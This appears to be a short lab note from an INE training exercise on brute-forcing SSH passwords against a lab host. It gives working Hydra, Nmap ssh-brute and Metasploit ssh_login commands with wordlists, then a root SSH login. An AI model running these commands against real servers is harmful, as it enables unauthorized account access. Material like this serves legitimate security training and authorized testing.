# Online Brute Force & Password Cracking

### Hydra

-l USERNAME
-P PASSWORD_LIST
```
hydra -l "student" -P /usr/share/wordlists/rockyou.txt.gz ssh://demo.ine.local
```

![1.1](./imgs/1.1.png)

### Nmap

-p PORT
```
echo "administrator" > user.lst
nmap -p 22 --script ssh-brute --script-args user="administrator",passdb=/usr/share/nmap/nselib/data/passwords.lst demo.ine.local
```

![2.1](./imgs/2.1.png)

### Metasploit

```
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set RHOSTS demo.ine.local
set RPORT 22
set VERBOSE true
set STOP_ON_SUCCESS true
exploit
```

![3.1](./imgs/3.1.png)

```
ssh root@demo.ine.local
```

![3.2](./imgs/3.2.png)